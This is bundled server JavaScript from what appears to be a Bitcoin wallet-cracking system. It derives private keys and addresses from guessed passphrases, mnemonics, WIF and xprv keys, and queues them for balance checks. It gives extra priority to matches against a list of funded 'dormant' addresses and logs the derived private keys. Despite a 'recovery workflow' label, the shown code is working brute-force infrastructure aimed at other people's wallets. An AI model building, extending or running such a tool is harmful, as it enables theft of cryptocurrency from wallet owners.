            const endTime = /* @__PURE__ */ new Date();
            const durationSeconds = (endTime.getTime() - startTime2.getTime()) / 1e3;
            await db.update(oceanTrajectories).set({
              status: "completed",
              endTime,
              finalResult: result,
              durationSeconds,
              nearMissCount: stats2?.nearMissCount ?? trajectory[0].nearMissCount,
              resonantCount: stats2?.resonantCount ?? trajectory[0].resonantCount,
              updatedAt: endTime
            }).where(eq6(oceanTrajectories.id, trajectoryId));
            return true;
          },
          "completeTrajectory",
          3
        );
        return opResult ?? false;
      }
      /**
       * Get active trajectories for an address
       */
      async getActiveTrajectories(address) {
        if (!db) return [];
        try {
          const conditions = [eq6(oceanTrajectories.status, "active")];
          if (address) conditions.push(eq6(oceanTrajectories.address, address));
          return await db.select().from(oceanTrajectories).where(and4(...conditions)).orderBy(desc4(oceanTrajectories.startTime));
        } catch (error) {
          console.error("[OceanPersistence] Failed to get active trajectories:", error);
          return [];
        }
      }
      /**
       * Get trajectory with its waypoints
       */
      async getTrajectoryWithWaypoints(trajectoryId) {
        if (!db) return { trajectory: null, waypoints: [] };
        try {
          const trajectories = await db.select().from(oceanTrajectories).where(eq6(oceanTrajectories.id, trajectoryId)).limit(1);
          if (trajectories.length === 0) {
            return { trajectory: null, waypoints: [] };
          }
          const waypoints = await db.select().from(oceanWaypoints).where(eq6(oceanWaypoints.trajectoryId, trajectoryId)).orderBy(asc3(oceanWaypoints.sequence));
          return { trajectory: trajectories[0], waypoints };
        } catch (error) {
          console.error("[OceanPersistence] Failed to get trajectory with waypoints:", error);
          return { trajectory: null, waypoints: [] };
        }
      }
      // ============================================================================
      // QUANTUM STATE - Wave function and entropy tracking
      // ============================================================================
      /**
       * Get or initialize quantum state
       */
      async getQuantumState() {
        if (!db) return null;
        try {
          const states = await db.select().from(oceanQuantumState).where(eq6(oceanQuantumState.id, "singleton")).limit(1);
          if (states.length === 0) {
            await db.insert(oceanQuantumState).values({
              id: "singleton",
              entropy: 256,
              initialEntropy: 256,
              totalProbability: 1,
              measurementCount: 0,
              successfulMeasurements: 0,
              status: "searching"
            });
            return await db.select().from(oceanQuantumState).where(eq6(oceanQuantumState.id, "singleton")).limit(1).then((r) => r[0] ?? null);
          }
          return states[0];
        } catch (error) {
          console.error("[OceanPersistence] Failed to get quantum state:", error);
          return null;
        }
      }
      /**
       * Update quantum state after a measurement
       */
      async updateQuantumState(update) {
        if (!db) return false;
        try {
          await db.update(oceanQuantumState).set({
            ...update,
            lastMeasurementAt: /* @__PURE__ */ new Date(),
            updatedAt: /* @__PURE__ */ new Date()
          }).where(eq6(oceanQuantumState.id, "singleton"));
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to update quantum state:", error);
          return false;
        }
      }
      // ============================================================================
      // EXCLUDED REGIONS - Regions excluded from possibility space
      // ============================================================================
      /**
       * Insert an excluded region
       */
      async insertExcludedRegion(region) {
        if (!db) return false;
        try {
          await db.insert(oceanExcludedRegions).values({
            id: region.id,
            dimension: region.dimension,
            origin: region.origin,
            basis: region.basis,
            measure: region.measure,
            phi: region.phi,
            regime: region.regime
          }).onConflictDoNothing();
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to insert excluded region:", error);
          return false;
        }
      }
      /**
       * Get excluded regions (top by measure)
       */
      async getExcludedRegions(limit = 100) {
        if (!db) return [];
        try {
          return await db.select().from(oceanExcludedRegions).orderBy(desc4(oceanExcludedRegions.measure)).limit(limit);
        } catch (error) {
          console.error("[OceanPersistence] Failed to get excluded regions:", error);
          return [];
        }
      }
      /**
       * Get excluded region count
       */
      async getExcludedRegionCount() {
        if (!db) return 0;
        try {
          const result = await db.select({ count: sql5`count(*)` }).from(oceanExcludedRegions);
          return Number(result[0]?.count ?? 0);
        } catch (error) {
          console.error("[OceanPersistence] Failed to get excluded region count:", error);
          return 0;
        }
      }
      // ============================================================================
      // TESTED PHRASES INDEX - Fast lookup for already-tested phrases
      // ============================================================================
      /**
       * Check if a phrase has been tested
       */
      async hasBeenTested(phrase) {
        if (!db) return false;
        try {
          const hash = crypto.createHash("sha256").update(phrase).digest("hex");
          const result = await db.select().from(testedPhrasesIndex).where(eq6(testedPhrasesIndex.phraseHash, hash)).limit(1);
          return result.length > 0;
        } catch (error) {
          console.error("[OceanPersistence] Failed to check tested phrase:", error);
          return false;
        }
      }
      /**
       * Mark a phrase as tested (BUFFERED - no immediate DB write)
       * Uses internal buffer to batch writes and prevent connection pool exhaustion
       */
      async markTested(phrase) {
        if (!db) return false;
        this.testedPhraseBuffer.add(phrase);
        if (this.testedPhraseBuffer.size >= this.BATCH_SIZE) {
          this.flushTestedPhrases().catch((err) => {
            console.error("[OceanPersistence] Background flush error:", err);
          });
        }
        return true;
      }
      /**
       * Batch mark phrases as tested (BUFFERED)
       * Adds to internal buffer for efficient batched writes
       */
      async batchMarkTested(phrases) {
        if (!db || phrases.length === 0) return 0;
        phrases.forEach((p) => this.testedPhraseBuffer.add(p));
        if (this.testedPhraseBuffer.size >= this.BATCH_SIZE) {
          await this.flushTestedPhrases();
        }
        return phrases.length;
      }
      /**
       * Get current buffer size (for monitoring)
       */
      getTestedPhraseBufferSize() {
        return this.testedPhraseBuffer.size;
      }
      // ============================================================================
      // NEAR-MISS PERSISTENCE - Tiered near-miss entries and clusters
      // ============================================================================
      /**
       * Insert or update a near-miss entry
       */
      async upsertNearMissEntry(entry) {
        if (!db) return false;
        try {
          const phraseHash = crypto.createHash("sha256").update(entry.phrase).digest("hex");
          await db.insert(nearMissEntries).values({
            id: entry.id,
            phrase: entry.phrase,
            phraseHash,
            phi: entry.phi,
            kappa: entry.kappa,
            regime: entry.regime,
            tier: entry.tier,
            source: entry.source,
            clusterId: entry.clusterId,
            phiHistory: entry.phiHistory,
            isEscalating: entry.isEscalating ?? false,
            queuePriority: entry.queuePriority ?? 1,
            structuralSignature: entry.structuralSignature,
            explorationCount: entry.explorationCount ?? 1
          }).onConflictDoUpdate({
            target: nearMissEntries.id,
            set: {
              phi: entry.phi,
              kappa: entry.kappa,
              tier: entry.tier,
              lastAccessedAt: /* @__PURE__ */ new Date(),
              phiHistory: entry.phiHistory,
              isEscalating: entry.isEscalating ?? false,
              queuePriority: entry.queuePriority ?? 1,
              explorationCount: entry.explorationCount ?? 1
            }
          });
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to upsert near-miss entry:", error);
          return false;
        }
      }
      /**
       * Batch insert/update near-miss entries
       */
      async batchUpsertNearMissEntries(entries) {
        if (!db || entries.length === 0) return 0;
        let count = 0;
        for (const entry of entries) {
          if (await this.upsertNearMissEntry(entry)) {
            count++;
          }
        }
        return count;
      }
      /**
       * Get near-miss entries by tier
       */
      async getNearMissEntriesByTier(tier, limit = 100) {
        if (!db) return [];
        try {
          if (tier) {
            return await db.select().from(nearMissEntries).where(eq6(nearMissEntries.tier, tier)).orderBy(desc4(nearMissEntries.phi)).limit(limit);
          }
          return await db.select().from(nearMissEntries).orderBy(desc4(nearMissEntries.phi)).limit(limit);
        } catch (error) {
          console.error("[OceanPersistence] Failed to get near-miss entries:", error);
          return [];
        }
      }
      /**
       * Get escalating near-miss entries
       */
      async getEscalatingNearMisses(limit = 100) {
        if (!db) return [];
        try {
          return await db.select().from(nearMissEntries).where(eq6(nearMissEntries.isEscalating, true)).orderBy(desc4(nearMissEntries.phi)).limit(limit);
        } catch (error) {
          console.error("[OceanPersistence] Failed to get escalating near-misses:", error);
          return [];
        }
      }
      /**
       * Get all near-miss entries for loading into memory
       */
      async getAllNearMissEntries() {
        if (!db) return [];
        try {
          return await db.select().from(nearMissEntries).orderBy(desc4(nearMissEntries.phi));
        } catch (error) {
          console.error("[OceanPersistence] Failed to get all near-miss entries:", error);
          return [];
        }
      }
      /**
       * Delete a near-miss entry
       */
      async deleteNearMissEntry(id) {
        if (!db) return false;
        try {
          await db.delete(nearMissEntries).where(eq6(nearMissEntries.id, id));
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to delete near-miss entry:", error);
          return false;
        }
      }
      /**
       * Get near-miss entry count
       */
      async getNearMissCount() {
        if (!db) return 0;
        try {
          const result = await db.select({ count: sql5`count(*)` }).from(nearMissEntries);
          return Number(result[0]?.count ?? 0);
        } catch (error) {
          console.error("[OceanPersistence] Failed to get near-miss count:", error);
          return 0;
        }
      }
      /**
       * Insert or update a near-miss cluster
       */
      async upsertNearMissCluster(cluster) {
        if (!db) return false;
        try {
          await db.insert(nearMissClusters).values({
            id: cluster.id,
            centroidPhrase: cluster.centroidPhrase,
            centroidPhi: cluster.centroidPhi,
            memberCount: cluster.memberCount,
            avgPhi: cluster.avgPhi,
            maxPhi: cluster.maxPhi,
            commonWords: cluster.commonWords,
            structuralPattern: cluster.structuralPattern
          }).onConflictDoUpdate({
            target: nearMissClusters.id,
            set: {
              centroidPhrase: cluster.centroidPhrase,
              centroidPhi: cluster.centroidPhi,
              memberCount: cluster.memberCount,
              avgPhi: cluster.avgPhi,
              maxPhi: cluster.maxPhi,
              commonWords: cluster.commonWords,
              structuralPattern: cluster.structuralPattern,
              lastUpdatedAt: /* @__PURE__ */ new Date()
            }
          });
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to upsert near-miss cluster:", error);
          return false;
        }
      }
      /**
       * Get all near-miss clusters
       */
      async getAllNearMissClusters() {
        if (!db) return [];
        try {
          return await db.select().from(nearMissClusters).orderBy(desc4(nearMissClusters.avgPhi));
        } catch (error) {
          console.error("[OceanPersistence] Failed to get near-miss clusters:", error);
          return [];
        }
      }
      /**
       * Delete a near-miss cluster
       */
      async deleteNearMissCluster(id) {
        if (!db) return false;
        try {
          await db.delete(nearMissClusters).where(eq6(nearMissClusters.id, id));
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to delete near-miss cluster:", error);
          return false;
        }
      }
      /**
       * Save adaptive state (thresholds and rolling distribution)
       */
      async saveNearMissAdaptiveState(state) {
        if (!db) return false;
        try {
          await db.insert(nearMissAdaptiveState).values({
            id: "singleton",
            rollingPhiDistribution: state.rollingPhiDistribution,
            hotThreshold: state.hotThreshold,
            warmThreshold: state.warmThreshold,
            coolThreshold: state.coolThreshold,
            distributionSize: state.rollingPhiDistribution.length,
            lastComputed: /* @__PURE__ */ new Date(),
            updatedAt: /* @__PURE__ */ new Date()
          }).onConflictDoUpdate({
            target: nearMissAdaptiveState.id,
            set: {
              rollingPhiDistribution: state.rollingPhiDistribution,
              hotThreshold: state.hotThreshold,
              warmThreshold: state.warmThreshold,
              coolThreshold: state.coolThreshold,
              distributionSize: state.rollingPhiDistribution.length,
              lastComputed: /* @__PURE__ */ new Date(),
              updatedAt: /* @__PURE__ */ new Date()
            }
          });
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to save near-miss adaptive state:", error);
          return false;
        }
      }
      /**
       * Load adaptive state
       */
      async loadNearMissAdaptiveState() {
        if (!db) return null;
        try {
          const results = await db.select().from(nearMissAdaptiveState).where(eq6(nearMissAdaptiveState.id, "singleton")).limit(1);
          return results[0] ?? null;
        } catch (error) {
          console.error("[OceanPersistence] Failed to load near-miss adaptive state:", error);
          return null;
        }
      }
      /**
       * Check if a phrase has already been recorded as a near-miss (deduplication)
       */
      async hasNearMissPhrase(phrase) {
        if (!db) return false;
        try {
          const phraseHash = crypto.createHash("sha256").update(phrase).digest("hex");
          const results = await db.select({ id: nearMissEntries.id }).from(nearMissEntries).where(eq6(nearMissEntries.phraseHash, phraseHash)).limit(1);
          return results.length > 0;
        } catch (error) {
          console.error("[OceanPersistence] Failed to check near-miss phrase:", error);
          return false;
        }
      }
      // ============================================================================
      // STATISTICS AND SUMMARY
      // ============================================================================
      /**
       * Get persistence statistics
       */
      async getStats() {
        const [
          probeCount,
          resonancePointCount,
          trajectoryCount,
          activeTrajectoryCount,
          excludedRegionCount,
          testedPhraseCount,
          nearMissCount,
          nearMissClusterCount,
          quantumState
        ] = await Promise.all([
          this.getProbeCount(),
          this.getResonancePoints(1).then((r) => r.length > 0 ? this.getResonancePoints(1e3).then((r2) => r2.length) : 0),
          db ? db.select({ count: sql5`count(*)` }).from(oceanTrajectories).then((r) => Number(r[0]?.count ?? 0)) : 0,
          db ? db.select({ count: sql5`count(*)` }).from(oceanTrajectories).where(eq6(oceanTrajectories.status, "active")).then((r) => Number(r[0]?.count ?? 0)) : 0,
          this.getExcludedRegionCount(),
          db ? db.select({ count: sql5`count(*)` }).from(testedPhrasesIndex).then((r) => Number(r[0]?.count ?? 0)) : 0,
          this.getNearMissCount(),
          db ? db.select({ count: sql5`count(*)` }).from(nearMissClusters).then((r) => Number(r[0]?.count ?? 0)) : 0,
          this.getQuantumState()
        ]);
        return {
          probeCount,
          resonancePointCount,
          trajectoryCount,
          activeTrajectoryCount,
          excludedRegionCount,
          testedPhraseCount,
          nearMissCount,
          nearMissClusterCount,
          quantumState
        };
      }
    };
    oceanPersistence = new OceanPersistence();
  }
});

// server/balance-queue-integration.ts
var balance_queue_integration_exports = {};
__export(balance_queue_integration_exports, {
  batchQueueAddresses: () => batchQueueAddresses,
  batchQueueMnemonics: () => batchQueueMnemonics,
  getQueueIntegrationStats: () => getQueueIntegrationStats,
  getTestedPhraseCount: () => getTestedPhraseCount,
  hasBeenTested: () => hasBeenTested,
  queueAddressForBalanceCheck: () => queueAddressForBalanceCheck,
  queueAddressFromPrivateKey: () => queueAddressFromPrivateKey,
  queueAddressFromWIF: () => queueAddressFromWIF,
  queueAddressesFromXprv: () => queueAddressesFromXprv,
  queueMnemonicForBalanceCheck: () => queueMnemonicForBalanceCheck
});
function queueAddressForBalanceCheck(passphrase, source = "unknown", priority = 1, nearMissTier, phi) {
  try {
    if (!passphrase || typeof passphrase !== "string" || passphrase.length === 0) {
      return null;
    }
    const privateKeyHex = derivePrivateKeyFromPassphrase(passphrase);
    const addresses2 = generateBothAddresses(passphrase);
    const compressedWif = privateKeyToWIF(privateKeyHex, true);
    const uncompressedWif = privateKeyToWIF(privateKeyHex, false);
    const sourceType = source === "python" || source === "mnemonic" || source === "manual" ? source : "typescript";
    let effectivePriority = priority;
    if (nearMissTier) {
      const tierBoost = nearMissTier === "hot" ? 10 : nearMissTier === "warm" ? 5 : 1;
      const phiBoost = phi ? Math.round(phi * 10) : 0;
      effectivePriority = priority + tierBoost + phiBoost;
    }
    const result = balanceQueue.enqueueBoth(
      addresses2.compressed,
      addresses2.uncompressed,
      passphrase,
      compressedWif,
      uncompressedWif,
      { priority: effectivePriority, source: sourceType }
    );
    if (result.compressed || result.uncompressed) {
      oceanPersistence.markTested(passphrase).catch((err) => {
        console.error("[BalanceQueueIntegration] Failed to mark phrase tested:", err);
      });
    }
    stats.totalQueued += (result.compressed ? 1 : 0) + (result.uncompressed ? 1 : 0);
    stats.lastQueueTime = Date.now();
    stats.sourceBreakdown[source] = (stats.sourceBreakdown[source] || 0) + (result.compressed ? 1 : 0) + (result.uncompressed ? 1 : 0);
    if (stats.totalQueued % 100 === 0) {
      console.log(`[BalanceQueueIntegration] Queued ${stats.totalQueued} addresses total. Sources:`, stats.sourceBreakdown);
    }
    return {
      passphrase,
      compressedAddress: addresses2.compressed,
      uncompressedAddress: addresses2.uncompressed,
      compressedWif,
      uncompressedWif,
      compressedQueued: result.compressed,
      uncompressedQueued: result.uncompressed
    };
  } catch (error) {
    console.error("[BalanceQueueIntegration] Error queuing address:", error);
    return null;
  }
}
function queueAddressFromPrivateKey(privateKeyHex, passphrase, source = "private-key", priority = 1) {
  try {
    if (!privateKeyHex || privateKeyHex.length !== 64) {
      return null;
    }
    const { generateBothAddressesFromPrivateKey: generateBothAddressesFromPrivateKey2 } = (init_crypto(), __toCommonJS(crypto_exports));
    const addresses2 = generateBothAddressesFromPrivateKey2(privateKeyHex);
    const compressedWif = privateKeyToWIF(privateKeyHex, true);
    const uncompressedWif = privateKeyToWIF(privateKeyHex, false);
    const sourceType = source === "python" || source === "mnemonic" || source === "manual" ? source : "typescript";
    const result = balanceQueue.enqueueBoth(
      addresses2.compressed,
      addresses2.uncompressed,
      passphrase,
      compressedWif,
      uncompressedWif,
      { priority, source: sourceType }
    );
    if (result.compressed || result.uncompressed) {
      oceanPersistence.markTested(passphrase).catch((err) => {
        console.error("[BalanceQueueIntegration] Failed to mark phrase tested:", err);
      });
    }
    stats.totalQueued += (result.compressed ? 1 : 0) + (result.uncompressed ? 1 : 0);
    stats.lastQueueTime = Date.now();
    stats.sourceBreakdown[source] = (stats.sourceBreakdown[source] || 0) + (result.compressed ? 1 : 0) + (result.uncompressed ? 1 : 0);
    return {
      passphrase,
      compressedAddress: addresses2.compressed,
      uncompressedAddress: addresses2.uncompressed,
      compressedWif,
      uncompressedWif,
      compressedQueued: result.compressed,
      uncompressedQueued: result.uncompressed
    };
  } catch (error) {
    console.error("[BalanceQueueIntegration] Error queuing from private key:", error);
    return null;
  }
}
function getQueueIntegrationStats() {
  return {
    ...stats,
    queueSize: balanceQueue.size()
  };
}
function batchQueueAddresses(passphrases, source = "batch", priority = 1) {
  let queued = 0;
  let failed = 0;
  for (const passphrase of passphrases) {
    const result = queueAddressForBalanceCheck(passphrase, source, priority);
    if (result && (result.compressedQueued || result.uncompressedQueued)) {
      queued++;
    } else {
      failed++;
    }
  }
  console.log(`[BalanceQueueIntegration] Batch queued ${queued} passphrases from ${source}, ${failed} failed`);
  return { queued, failed };
}
function queueMnemonicForBalanceCheck(mnemonic, source = "mnemonic", priority = 2) {
  try {
    if (!mnemonic || typeof mnemonic !== "string" || mnemonic.trim().length === 0) {
      return null;
    }
    const derivationResult = deriveMnemonicAddresses(mnemonic);
    if (derivationResult.totalDerived === 0) {
      console.warn(`[BalanceQueueIntegration] No addresses derived from mnemonic`);
      return null;
    }
    const dormantCheckResult = checkMnemonicAgainstDormant(mnemonic);
    let queuedCount = 0;
    let failedCount = 0;
    const derivedAddresses = [];
    for (const derived of derivationResult.addresses) {
      const isDormant = dormantCheckResult.matches.some((m) => m.address === derived.address);
      const result = balanceQueue.enqueue(
        derived.address,
        mnemonic,
        derived.privateKeyWIFCompressed,
        true,
        { priority: isDormant ? priority + 10 : priority, source: "mnemonic" }
      );
      const queued = result;
      if (queued) {
        queuedCount++;
      } else {
        failedCount++;
      }
      derivedAddresses.push({
        address: derived.address,
        path: derived.derivationPath,
        queued,
        isDormant
      });
    }
    if (queuedCount > 0) {
      oceanPersistence.markTested(mnemonic).catch((err) => {
        console.error("[BalanceQueueIntegration] Failed to mark mnemonic tested:", err);
      });
    }
    stats.totalQueued += queuedCount;
    stats.lastQueueTime = Date.now();
    const mnemonicSource = `${source}-mnemonic`;
    stats.sourceBreakdown[mnemonicSource] = (stats.sourceBreakdown[mnemonicSource] || 0) + queuedCount;
    if (dormantCheckResult.hasMatch) {
      console.log(`[BalanceQueueIntegration] \u{1F3AF} MNEMONIC HAS DORMANT MATCHES!`);
      console.log(`[BalanceQueueIntegration]   Mnemonic: ${mnemonic.substring(0, 40)}...`);
      console.log(`[BalanceQueueIntegration]   Matches: ${dormantCheckResult.matches.length}`);
      for (const match of dormantCheckResult.matches) {
        console.log(`[BalanceQueueIntegration]   - ${match.address} @ ${match.derivationPath} (${match.dormantInfo.balanceBTC} BTC)`);
      }
    }
    if (queuedCount > 0 && (stats.totalQueued % 500 === 0 || dormantCheckResult.hasMatch)) {
      console.log(`[BalanceQueueIntegration] Mnemonic: ${queuedCount}/${derivationResult.totalDerived} addresses queued from ${source}`);
    }
    return {
      mnemonic,
      totalAddresses: derivationResult.totalDerived,
      queuedAddresses: queuedCount,
      failedAddresses: failedCount,
      dormantMatches: dormantCheckResult.matches.length,
      derivedAddresses
    };
  } catch (error) {
    console.error("[BalanceQueueIntegration] Error queuing mnemonic:", error);
    return null;
  }
}
function batchQueueMnemonics(mnemonics, source = "batch-mnemonic", priority = 2) {
  let successfulMnemonics = 0;
  let failedMnemonics = 0;
  let totalAddressesQueued = 0;
  let dormantMatchesFound = 0;
  for (const mnemonic of mnemonics) {
    const result = queueMnemonicForBalanceCheck(mnemonic, source, priority);
    if (result) {
      successfulMnemonics++;
      totalAddressesQueued += result.queuedAddresses;
      dormantMatchesFound += result.dormantMatches;
    } else {
      failedMnemonics++;
    }
  }
  console.log(`[BalanceQueueIntegration] Batch mnemonic queue: ${successfulMnemonics}/${mnemonics.length} mnemonics processed`);
  console.log(`[BalanceQueueIntegration]   Total addresses queued: ${totalAddressesQueued}`);
  console.log(`[BalanceQueueIntegration]   Dormant matches: ${dormantMatchesFound}`);
  return {
    totalMnemonics: mnemonics.length,
    successfulMnemonics,
    failedMnemonics,
    totalAddressesQueued,
    dormantMatchesFound
  };
}
function queueAddressFromWIF(wif, source = "wif-input", priority = 3) {
  try {
    if (!wif || typeof wif !== "string" || wif.length < 50) {
      console.warn("[BalanceQueueIntegration] Invalid WIF format");
      return null;
    }
    const { wifToPrivateKeyHex: wifToPrivateKeyHex2, generateBothAddressesFromPrivateKey: generateBothAddressesFromPrivateKey2 } = (init_crypto(), __toCommonJS(crypto_exports));
    let privateKeyHex;
    let isCompressed;
    try {
      const result2 = wifToPrivateKeyHex2(wif);
      privateKeyHex = result2.privateKeyHex;
      isCompressed = result2.compressed;
    } catch (err) {
      console.error("[BalanceQueueIntegration] Invalid WIF key:", err);
      return null;
    }
    const addresses2 = generateBothAddressesFromPrivateKey2(privateKeyHex);
    const compressedWif = privateKeyToWIF(privateKeyHex, true);
    const uncompressedWif = privateKeyToWIF(privateKeyHex, false);
    const sourceType = source === "python" || source === "mnemonic" || source === "manual" ? source : "typescript";
    const result = balanceQueue.enqueueBoth(
      addresses2.compressed,
      addresses2.uncompressed,
      `WIF:${wif.substring(0, 8)}...`,
      // Store partial WIF as reference
      compressedWif,
      uncompressedWif,
      { priority, source: sourceType }
    );
    stats.totalQueued += (result.compressed ? 1 : 0) + (result.uncompressed ? 1 : 0);
    stats.lastQueueTime = Date.now();
    stats.sourceBreakdown[source] = (stats.sourceBreakdown[source] || 0) + (result.compressed ? 1 : 0) + (result.uncompressed ? 1 : 0);
    console.log(`[BalanceQueueIntegration] Queued WIF-derived addresses: ${addresses2.compressed}, ${addresses2.uncompressed}`);
    return {
      passphrase: `WIF:${wif.substring(0, 8)}...`,
      compressedAddress: addresses2.compressed,
      uncompressedAddress: addresses2.uncompressed,
      compressedWif,
      uncompressedWif,
      compressedQueued: result.compressed,
      uncompressedQueued: result.uncompressed
    };
  } catch (error) {
    console.error("[BalanceQueueIntegration] Error queuing from WIF:", error);
    return null;
  }
}
function queueAddressesFromXprv(xprv, source = "xprv-input", priority = 3, addressCount = 20) {
  try {
    if (!xprv || typeof xprv !== "string" || !xprv.startsWith("xprv")) {
      console.warn('[BalanceQueueIntegration] Invalid xprv format - must start with "xprv"');
      return null;
    }
    const { deriveFromXprv: deriveFromXprv2, generateBothAddressesFromPrivateKey: generateBothAddressesFromPrivateKey2 } = (init_crypto(), __toCommonJS(crypto_exports));
    const derivedAddresses = [];
    let queuedCount = 0;
    let failedCount = 0;
    const paths = [
      // Account 0 receiving
      ...Array.from({ length: addressCount }, (_, i) => `m/44'/0'/0'/0/${i}`),
      // Account 0 change
      ...Array.from({ length: Math.floor(addressCount / 2) }, (_, i) => `m/44'/0'/0'/1/${i}`),
      // Legacy paths
      ...Array.from({ length: 10 }, (_, i) => `m/0/${i}`)
    ];
    for (const path20 of paths) {
      try {
        const privateKeyHex = deriveFromXprv2(xprv, path20);
        if (!privateKeyHex) continue;
        const addresses2 = generateBothAddressesFromPrivateKey2(privateKeyHex);
        const compressedWif = privateKeyToWIF(privateKeyHex, true);
        const uncompressedWif = privateKeyToWIF(privateKeyHex, false);
        const sourceType = source === "python" || source === "mnemonic" || source === "manual" ? source : "typescript";
        const result = balanceQueue.enqueueBoth(
          addresses2.compressed,
          addresses2.uncompressed,
          `xprv:${path20}`,
          compressedWif,
          uncompressedWif,
          { priority, source: sourceType }
        );
        const queued = result.compressed || result.uncompressed;
        derivedAddresses.push({
          address: addresses2.compressed,
          path: path20,
          queued
        });
        if (queued) {
          queuedCount++;
          stats.totalQueued += (result.compressed ? 1 : 0) + (result.uncompressed ? 1 : 0);
        }
      } catch (pathError) {
        failedCount++;
        console.error(`[BalanceQueueIntegration] Error deriving path ${path20}:`, pathError);
      }
    }
    stats.lastQueueTime = Date.now();
    stats.sourceBreakdown[source] = (stats.sourceBreakdown[source] || 0) + queuedCount;
    console.log(`[BalanceQueueIntegration] Queued ${queuedCount} addresses from xprv (${paths.length} paths)`);
    return {
      xprv: `${xprv.substring(0, 15)}...`,
      totalAddresses: paths.length,
      queuedAddresses: queuedCount,
      failedAddresses: failedCount,
      derivedAddresses
    };
  } catch (error) {
    console.error("[BalanceQueueIntegration] Error queuing from xprv:", error);
    return null;
  }
}
async function hasBeenTested(phrase) {
  return oceanPersistence.hasBeenTested(phrase);
}
async function getTestedPhraseCount() {
  const stats2 = await oceanPersistence.getStats();
  return stats2.testedPhraseCount;
}
var stats;
var init_balance_queue_integration = __esm({
  "server/balance-queue-integration.ts"() {
    "use strict";
    init_crypto();
    init_balance_queue();
    init_mnemonic_wallet();
    init_ocean_persistence();
    stats = {
      totalQueued: 0,
      lastQueueTime: 0,
      sourceBreakdown: {}
    };
  }
});

// server/search-coordinator.ts
var search_coordinator_exports = {};
__export(search_coordinator_exports, {
  searchCoordinator: () => searchCoordinator
});
import { randomUUID as randomUUID2 } from "crypto";
var SearchCoordinator, searchCoordinator;
var init_search_coordinator = __esm({
  "server/search-coordinator.ts"() {
    "use strict";
    init_storage();
    init_crypto();
    init_qig_pure_v2();
    init_qig_universal();
    init_basin_velocity_monitor();
    init_resonance_detector();
    init_known_phrases();
    init_bip39_words();
    init_local_search();
    init_discovery_tracker();
    init_telemetry_api();
    init_consciousness_search_controller();
    init_physics_constants();
    init_balance_queue_integration();
    SearchCoordinator = class {
      isRunning = false;
      currentJobId = null;
      intervalId = null;
      discoveryTrackers = /* @__PURE__ */ new Map();
      modeExplorationBatches = /* @__PURE__ */ new Map();
      // Track batches in exploration mode
      modeInvestigationBatches = /* @__PURE__ */ new Map();
      // Track batches in investigation mode
      // Pure QIG monitors (measurements only, no optimization)
      velocityMonitors = /* @__PURE__ */ new Map();
      resonanceDetectors = /* @__PURE__ */ new Map();
      // Public getter for coordinator status
      get running() {
        return this.isRunning;
      }
      async syncWorkflowProgress(jobId, job) {
        try {
          const { observerStorage: observerStorage2 } = await Promise.resolve().then(() => (init_observer_storage(), observer_storage_exports));
          const workflow = await observerStorage2.findWorkflowBySearchJobId(jobId);
          if (!workflow) {
            return;
          }
          const progress = workflow.progress;
          const searchProgress = progress?.constrainedSearchProgress || {};
          const updatedSearchProgress = {
            ...searchProgress,
            phrasesTested: job.progress.tested,
            phrasesGenerated: job.progress.tested,
            highPhiCount: job.progress.highPhiCount,
            searchStatus: job.status === "completed" ? "completed" : job.status === "failed" ? "failed" : "running",
            matchFound: job.progress.matchFound === true
          };
          const updatedProgress = {
            ...progress,
            constrainedSearchProgress: updatedSearchProgress,
            lastUpdatedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          const updates = {
            progress: updatedProgress
          };
          if (job.status === "completed" && job.progress.matchFound === true && workflow.status === "active") {
            updates.status = "completed";
            updates.completedAt = /* @__PURE__ */ new Date();
            console.log(`[SearchCoordinator] Workflow ${workflow.id} marked as completed (match found!)`);
          } else if (job.status === "failed" && workflow.status === "active") {
            updates.status = "failed";
            updates.notes = (workflow.notes || "") + `
Search failed: ${job.progress.lastHighPhiStep || "Unknown error"}`;
            console.log(`[SearchCoordinator] Workflow ${workflow.id} marked as failed`);
          }
          await observerStorage2.updateRecoveryWorkflow(workflow.id, updates);
        } catch (error) {
          console.error(`[SearchCoordinator] Failed to sync workflow progress for job ${jobId}:`, error);
        }
      }
      async start() {
        if (this.isRunning) {
          console.log("[SearchCoordinator] Already running");
          return;
        }
        const purityCheck2 = validatePurity();
        if (!purityCheck2.isPure) {
          console.error("[SearchCoordinator] \u26A0\uFE0F  PURITY VIOLATION DETECTED:");
          for (const violation of purityCheck2.violations) {
            console.error(`  \u274C ${violation}`);
          }
          throw new Error("QIG implementation is impure. Cannot start search coordinator.");
        }
        console.log("[SearchCoordinator] \u2705 QIG purity validated");
        this.isRunning = true;
        console.log("[SearchCoordinator] Starting background worker");
        this.intervalId = setInterval(async () => {
          await this.processJobs();
        }, 1e3);
      }
      stop() {
        if (this.intervalId) {
          clearInterval(this.intervalId);
          this.intervalId = null;
        }
        this.isRunning = false;
        console.log("[SearchCoordinator] Stopped background worker");
      }
      async processJobs() {
        if (this.currentJobId) {
          return;
        }
        const jobs = await storage.getSearchJobs();
        let jobToProcess = jobs.find((j) => j.status === "running");
        if (!jobToProcess) {
          jobToProcess = jobs.find((j) => j.status === "pending");
        }
        if (!jobToProcess) {
          return;
        }
        this.currentJobId = jobToProcess.id;
        try {
          await this.executeJob(jobToProcess.id);
        } catch (error) {
          console.error(`[SearchCoordinator] Job ${jobToProcess.id} failed:`, error);
          await storage.appendJobLog(jobToProcess.id, { message: `Job failed: ${error.message}`, type: "error" });
          await storage.updateSearchJob(jobToProcess.id, { status: "failed" });
          endTelemetrySession(jobToProcess.id, { success: false });
        } finally {
          this.currentJobId = null;
        }
      }
      async executeJob(jobId) {
        let job = await storage.getSearchJob(jobId);
        if (!job || job.status === "stopped") {
          return;
        }
        if (job.status === "pending") {
          await storage.updateSearchJob(jobId, {
            status: "running",
            stats: { startTime: (/* @__PURE__ */ new Date()).toISOString(), rate: 0 }
          });
          await storage.appendJobLog(jobId, { message: "Search started", type: "info" });
          initTelemetrySession(jobId);
          console.log(`[SearchCoordinator] Telemetry session initialized for job ${jobId}`);
          job = await storage.getSearchJob(jobId);
        }
